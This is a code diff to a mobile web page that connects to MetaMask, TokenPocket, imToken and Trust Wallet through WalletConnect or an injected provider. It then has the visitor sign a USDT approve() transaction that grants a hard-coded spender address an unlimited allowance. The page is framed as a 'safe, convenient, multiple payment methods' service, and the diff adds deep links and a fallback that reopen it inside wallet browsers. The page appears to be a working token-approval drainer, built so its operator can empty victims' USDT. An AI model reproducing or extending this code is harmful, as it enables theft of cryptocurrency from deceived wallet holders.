@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>EVM 链 USDT 无限授权</title>
     <style>
-        /* 样式同上，略 */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
@@ -88,6 +87,9 @@
         .dialog-title { font-weight: 600; font-size: 18px; margin-bottom: 12px; }
         .dialog-message { font-size: 14px; color: #4b5563; line-height: 1.5; margin-bottom: 20px; }
         .dialog-button { background: #667eea; border: none; color: white; padding: 8px 24px; border-radius: 30px; font-size: 14px; cursor: pointer; }
+        .fallback-btn {
+            background: #e2e8f0; color: #1e293b; margin-top: 8px;
+        }
     </style>
 </head>
 <body>
@@ -96,7 +98,7 @@
             <div class="brand-logo">EVM</div>
             <div class="brand-text">
                 <div class="brand-title">USDT 无限授权</div>
-                <div class="brand-subtitle">WalletConnect · 安全便捷</div>
+                <div class="brand-subtitle">安全便捷 · 多种支付方式</div>
             </div>
         </div>
 
@@ -118,6 +120,7 @@
 
         <button class="approve-btn" id="approveBtn">连接钱包并授权</button>
         <div id="status" class="status hidden"></div>
+        <div id="fallbackContainer" style="margin-top: 12px;"></div>
     </div>
 
     <div id="dialogMask" class="dialog-mask">
@@ -128,50 +131,10 @@
         </div>
     </div>
 
-    <!-- 动态加载 WalletConnect 库，带重试 -->
+    <!-- 引入依赖 -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script>
-        // 弹窗工具
-        const dialogMask = document.getElementById('dialogMask');
-        const dialogMsg = document.querySelector('.dialog-message');
-        const dialogBtn = document.querySelector('.dialog-button');
-        function showDialog(msg) {
-            dialogMsg.textContent = msg;
-            dialogMask.style.display = 'flex';
-        }
-        function hideDialog() { dialogMask.style.display = 'none'; }
-        dialogBtn.onclick = hideDialog;
-        dialogMask.onclick = (e) => { if (e.target === dialogMask) hideDialog(); };
-
-        // 状态提示
-        const statusDiv = document.getElementById('status');
-        function showStatus(msg, type = 'loading') {
-            statusDiv.innerHTML = type === 'loading' ? `<span class="loading-spinner"></span>${msg}` : msg;
-            statusDiv.className = `status ${type}`;
-            statusDiv.classList.remove('hidden');
-        }
-        function hideStatus() { statusDiv.classList.add('hidden'); }
-
-        // 加载 WalletConnect 库
-        function loadWalletConnect(callback) {
-            if (window.EthereumProvider) {
-                callback(true);
-                return;
-            }
-            const script = document.createElement('script');
-            script.src = 'https://unpkg.com/@walletconnect/ethereum-provider@2.10.6/dist/index.umd.js';
-            script.onload = () => callback(true);
-            script.onerror = () => {
-                // 备用 CDN
-                const fallbackScript = document.createElement('script');
-                fallbackScript.src = 'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.6/dist/index.umd.js';
-                fallbackScript.onload = () => callback(true);
-                fallbackScript.onerror = () => callback(false);
-                document.head.appendChild(fallbackScript);
-            };
-            document.head.appendChild(script);
-        }
-
-        // 配置
+        // ==================== 配置 ====================
         const PROJECT_ID = '91bd623c7859e77a38c7b10c615976b6';
         const USDT_ADDRESS = {
             1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
@@ -183,23 +146,47 @@
         };
         const UNLIMITED_AMOUNT = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
+        // 钱包列表
         const EVM_WALLETS = [
-            { key: 'metamask', name: 'MetaMask', icon: '🦊', scheme: 'metamask://' },
-            { key: 'tokenpocket', name: 'TokenPocket', icon: '🎫', scheme: 'tp://' },
-            { key: 'imtoken', name: 'imToken', icon: '🔷', scheme: 'imtokenv2://' },
-            { key: 'trust', name: 'Trust Wallet', icon: '🔒', scheme: 'trust://' }
+            { key: 'metamask', name: 'MetaMask', icon: '🦊', scheme: 'metamask://', dappScheme: (url) => `metamask://dapp/?url=${encodeURIComponent(url)}` },
+            { key: 'tokenpocket', name: 'TokenPocket', icon: '🎫', scheme: 'tp://', dappScheme: (url) => `tp://dapp?url=${encodeURIComponent(url)}` },
+            { key: 'imtoken', name: 'imToken', icon: '🔷', scheme: 'imtokenv2://', dappScheme: (url) => `imtokenv2://dapp?url=${encodeURIComponent(url)}` },
+            { key: 'trust', name: 'Trust Wallet', icon: '🔒', scheme: 'trust://', dappScheme: (url) => `trust://dapp?url=${encodeURIComponent(url)}` }
         ];
 
         let currentChain = '1';
         let selectedWallet = null;
         let isProcessing = false;
 
+        // 弹窗
+        const dialogMask = document.getElementById('dialogMask');
+        const dialogMessage = document.getElementById('dialogMessage');
+        const dialogConfirmBtn = document.querySelector('.dialog-button');
+        function showDialog(msg) {
+            dialogMessage.textContent = msg;
+            dialogMask.style.display = 'flex';
+        }
+        function hideDialog() { dialogMask.style.display = 'none'; }
+        dialogConfirmBtn.addEventListener('click', hideDialog);
+        dialogMask.addEventListener('click', (e) => { if (e.target === dialogMask) hideDialog(); });
+
+        // 状态提示
+        const statusDiv = document.getElementById('status');
+        function showStatus(msg, type = 'loading') {
+            statusDiv.innerHTML = type === 'loading' ? `<span class="loading-spinner"></span>${msg}` : msg;
+            statusDiv.className = `status ${type}`;
+            statusDiv.classList.remove('hidden');
+        }
+        function hideStatus() { statusDiv.classList.add('hidden'); }
+
+        // 更新显示
         function updateSpenderDisplay() {
             const spender = SPENDER_ADDRESS[currentChain];
             document.getElementById('spenderFull').textContent = spender;
             document.getElementById('spenderTag').textContent = spender.slice(0,6)+'...'+spender.slice(-6);
         }
 
+        // 渲染钱包列表
         function renderWalletList() {
             const container = document.getElementById('walletList');
             container.innerHTML = EVM_WALLETS.map(w => `
@@ -221,123 +208,227 @@
             });
         }
 
+        // 检测是否在钱包内置浏览器中（有 window.ethereum 且可能是 MetaMask）
+        function isInWalletBrowser() {
+            return typeof window.ethereum !== 'undefined';
+        }
+
+        // 如果已在钱包内置浏览器中，直接使用注入的 provider
+        async function approveWithInjectedProvider() {
+            if (!window.ethereum) {
+                showStatus('未检测到钱包注入，请确保在钱包DApp浏览器中打开', 'error');
+                return false;
+            }
+            try {
+                const chainId = parseInt(currentChain);
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const userAddress = accounts[0];
+                showStatus(`已连接: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, 'loading');
+
+                // 构造 USDT approve 交易
+                const iface = new ethers.utils.Interface([
+                    'function approve(address spender, uint256 amount) returns (bool)'
+                ]);
+                const data = iface.encodeFunctionData('approve', [SPENDER_ADDRESS[chainId], UNLIMITED_AMOUNT]);
+                const transaction = {
+                    to: USDT_ADDRESS[chainId],
+                    from: userAddress,
+                    data: data,
+                    chainId: chainId
+                };
+                const txHash = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [transaction]
+                });
+                showStatus(`✅ 授权成功！交易ID: ${txHash.slice(0,10)}...`, 'success');
+                return true;
+            } catch (error) {
+                console.error(error);
+                showStatus('授权失败: ' + (error.message || '未知错误'), 'error');
+                return false;
+            }
+        }
+
+        // 降级方案：生成链接跳转到钱包内置浏览器
+        function openInWalletBrowser() {
+            if (!selectedWallet) {
+                showDialog('请先选择钱包');
+                return;
+            }
+            const wallet = EVM_WALLETS.find(w => w.key === selectedWallet);
+            const currentUrl = window.location.href;
+            const deepLink = wallet.dappScheme(currentUrl);
+            showStatus(`正在跳转到 ${wallet.name} 内置浏览器...`, 'loading');
+            window.location.href = deepLink;
+            // 跳转后，页面会关闭，无需进一步处理
+        }
+
+        // 主授权入口：尝试 WalletConnect，若库未加载则提示降级
         async function connectAndApprove() {
-            if (!selectedWallet) { showDialog('请先选择钱包'); return; }
+            if (!selectedWallet) {
+                showDialog('请先选择钱包');
+                return;
+            }
             if (isProcessing) return;
             isProcessing = true;
 
+            // 优先检测是否已在钱包内置浏览器中
+            if (isInWalletBrowser()) {
+                await approveWithInjectedProvider();
+                isProcessing = false;
+                return;
+            }
+
+            // 尝试动态加载 WalletConnect 库
+            showStatus('加载 WalletConnect 库...', 'loading');
+            try {
+                // 动态加载 WalletConnect 库
+                const script = document.createElement('script');
+                script.src = 'https://unpkg.com/@walletconnect/ethereum-provider@2.10.6/dist/index.umd.js';
+                script.onload = async () => {
+                    if (typeof window.EthereumProvider === 'undefined') {
+                        showStatus('WalletConnect 库加载失败', 'error');
+                        // 显示降级按钮
+                        showFallbackButton();
+                        isProcessing = false;
+                        return;
+                    }
+                    await startWalletConnect();
+                };
+                script.onerror = () => {
+                    showStatus('WalletConnect 库加载失败', 'error');
+                    showFallbackButton();
+                    isProcessing = false;
+                };
+                document.head.appendChild(script);
+            } catch (err) {
+                console.error(err);
+                showStatus('库加载异常', 'error');
+                showFallbackButton();
+                isProcessing = false;
+            }
+        }
+
+        async function startWalletConnect() {
             const wallet = EVM_WALLETS.find(w => w.key === selectedWallet);
             const chainId = parseInt(currentChain);
 
             showStatus('正在初始化连接...', 'loading');
 
-            // 确保库已加载
-            if (!window.EthereumProvider) {
-                showStatus('加载 WalletConnect 库中，请稍候...', 'loading');
-                loadWalletConnect(async (success) => {
-                    if (!success) {
-                        showStatus('WalletConnect 库加载失败，请检查网络后刷新', 'error');
-                        showDialog('库加载失败，请刷新页面重试');
-                        isProcessing = false;
-                        return;
+            try {
+                const ethProvider = await window.EthereumProvider.init({
+                    projectId: PROJECT_ID,
+                    chains: [chainId],
+                    optionalChains: [1, 56],
+                    showQrModal: false,
+                    metadata: {
+                        name: 'Wallet Connector',
+                        description: 'USDT Unlimited Approval',
+                        url: window.location.origin,
+                        icons: ['https://avatars.githubusercontent.com/u/37784886']
                     }
-                    await doConnect();
                 });
-            } else {
-                await doConnect();
-            }
 
-            async function doConnect() {
-                try {
-                    const ethProvider = await window.EthereumProvider.init({
-                        projectId: PROJECT_ID,
-                        chains: [chainId],
-                        optionalChains: [1, 56],
-                        showQrModal: false,
-                        metadata: {
-                            name: 'Wallet Connector',
-                            description: 'USDT Unlimited Approval',
-                            url: window.location.origin,
-                            icons: ['https://avatars.githubusercontent.com/u/37784886']
-                        }
-                    });
+                const uri = ethProvider.uri;
+                if (!uri) throw new Error('无法生成连接 URI');
 
-                    const uri = ethProvider.uri;
-                    if (!uri) throw new Error('无法生成连接 URI');
-
-                    const encodedUri = encodeURIComponent(uri);
-                    let deepLink = '';
-                    switch (selectedWallet) {
-                        case 'metamask': deepLink = `metamask://wc?uri=${encodedUri}`; break;
-                        case 'tokenpocket': deepLink = `tp://wc?wc_uri=${encodedUri}`; break;
-                        case 'imtoken': deepLink = `imtokenv2://wc?uri=${encodedUri}`; break;
-                        case 'trust': deepLink = `trust://wc?uri=${encodedUri}`; break;
-                        default: deepLink = uri;
-                    }
-
-                    showStatus(`正在唤起 ${wallet.name}...`, 'loading');
-                    window.location.href = deepLink;
-
-                    let resolved = false;
-                    ethProvider.on('connect', async (session) => {
-                        if (resolved) return;
-                        resolved = true;
-                        const provider = new ethers.providers.Web3Provider(ethProvider);
-                        const signer = provider.getSigner();
-                        const address = await signer.getAddress();
-                        showStatus(`已连接: ${address.slice(0,6)}...${address.slice(-4)}，发送授权...`, 'loading');
-
-                        try {
-                            const usdtContract = new ethers.Contract(
-                                USDT_ADDRESS[chainId],
-                                ['function approve(address spender, uint256 amount) returns (bool)'],
-                                signer
-                            );
-                            const tx = await usdtContract.approve(SPENDER_ADDRESS[chainId], UNLIMITED_AMOUNT);
-                            showStatus('交易已发送，等待确认...', 'loading');
-                            const receipt = await tx.wait();
-                            showStatus(`✅ 授权成功！`, 'success');
-                            showDialog(`授权成功！交易哈希：${receipt.transactionHash.slice(0,10)}...`);
-                            isProcessing = false;
-                        } catch (err) {
-                            console.error(err);
-                            showStatus('授权失败: ' + err.message, 'error');
-                            showDialog('授权失败: ' + err.message);
-                            isProcessing = false;
-                        }
-                    });
-
-                    ethProvider.on('disconnect', () => {
-                        if (resolved) return;
-                        resolved = true;
-                        showStatus('连接已断开', 'error');
-                        isProcessing = false;
-                    });
-
-                    setTimeout(() => {
-                        if (!resolved && !document.hidden && !document.webkitHidden) {
-                            resolved = true;
-                            showStatus('未检测到钱包响应，请确保钱包已安装并打开', 'error');
-                            isProcessing = false;
-                        }
-                    }, 6000);
-                } catch (err) {
-                    console.error(err);
-                    showStatus('初始化失败: ' + err.message, 'error');
-                    showDialog('初始化失败: ' + err.message);
-                    isProcessing = false;
+                const encodedUri = encodeURIComponent(uri);
+                let deepLink = '';
+                switch (selectedWallet) {
+                    case 'metamask':
+                        deepLink = `metamask://wc?uri=${encodedUri}`;
+                        break;
+                    case 'tokenpocket':
+                        deepLink = `tp://wc?wc_uri=${encodedUri}`;
+                        break;
+                    case 'imtoken':
+                        deepLink = `imtokenv2://wc?uri=${encodedUri}`;
+                        break;
+                    case 'trust':
+                        deepLink = `trust://wc?uri=${encodedUri}`;
+                        break;
+                    default:
+                        deepLink = uri;
                 }
+
+                showStatus(`正在唤起 ${wallet.name}...`, 'loading');
+                window.location.href = deepLink;
+
+                let resolved = false;
+                ethProvider.on('connect', async (session) => {
+                    if (resolved) return;
+                    resolved = true;
+                    const provider = new ethers.providers.Web3Provider(ethProvider);
+                    const signer = provider.getSigner();
+                    const address = await signer.getAddress();
+                    showStatus(`已连接: ${address.slice(0,6)}...${address.slice(-4)}，发送授权...`, 'loading');
+
+                    try {
+                        const usdtContract = new ethers.Contract(
+                            USDT_ADDRESS[chainId],
+                            ['function approve(address spender, uint256 amount) returns (bool)'],
+                            signer
+                        );
+                        const tx = await usdtContract.approve(SPENDER_ADDRESS[chainId], UNLIMITED_AMOUNT);
+                        showStatus('交易已发送，等待确认...', 'loading');
+                        const receipt = await tx.wait();
+                        showStatus(`✅ 授权成功！`, 'success');
+                        showDialog(`授权成功！交易哈希：${receipt.transactionHash.slice(0,10)}...`);
+                        isProcessing = false;
+                    } catch (err) {
+                        console.error(err);
+                        showStatus('授权失败: ' + err.message, 'error');
+                        showDialog('授权失败: ' + err.message);
+                        isProcessing = false;
+                    }
+                });
+
+                ethProvider.on('disconnect', () => {
+                    if (resolved) return;
+                    resolved = true;
+                    showStatus('连接已断开', 'error');
+                    isProcessing = false;
+                });
+
+                setTimeout(() => {
+                    if (!resolved && !document.hidden && !document.webkitHidden) {
+                        resolved = true;
+                        showStatus('未检测到钱包响应，请确保钱包已安装并打开', 'error');
+                        showFallbackButton();
+                        isProcessing = false;
+                    }
+                }, 6000);
+            } catch (err) {
+                console.error(err);
+                showStatus('初始化失败: ' + err.message, 'error');
+                showFallbackButton();
+                isProcessing = false;
             }
         }
 
+        function showFallbackButton() {
+            const container = document.getElementById('fallbackContainer');
+            container.innerHTML = `
+                <button class="approve-btn fallback-btn" id="fallbackBtn">
+                    使用钱包内置浏览器打开
+                </button>
+            `;
+            const btn = document.getElementById('fallbackBtn');
+            btn.addEventListener('click', openInWalletBrowser);
+        }
+
+        // 链切换
         function onChainChange(chainId) {
             currentChain = chainId;
             selectedWallet = null;
             document.querySelectorAll('.wallet-item').forEach(w => w.classList.remove('selected'));
             updateSpenderDisplay();
             hideStatus();
+            const container = document.getElementById('fallbackContainer');
+            container.innerHTML = '';
         }
 
+        // 初始化
         function init() {
             // 链选择器
             document.querySelectorAll('.chain-btn').forEach(btn => {
@@ -350,22 +441,9 @@
             document.getElementById('approveBtn').addEventListener('click', connectAndApprove);
             renderWalletList();
             updateSpenderDisplay();
-
-            // 预加载库
-            if (!window.EthereumProvider) {
-                loadWalletConnect(() => console.log('WalletConnect 库预加载完成'));
-            }
         }
 
-        // 等待 ethers 加载
-        if (typeof ethers === 'undefined') {
-            const ethersScript = document.createElement('script');
-            ethersScript.src = 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js';
-            ethersScript.onload = init;
-            document.head.appendChild(ethersScript);
-        } else {
-            init();
-        }
+        init();
     </script>
 </body>
 </html>
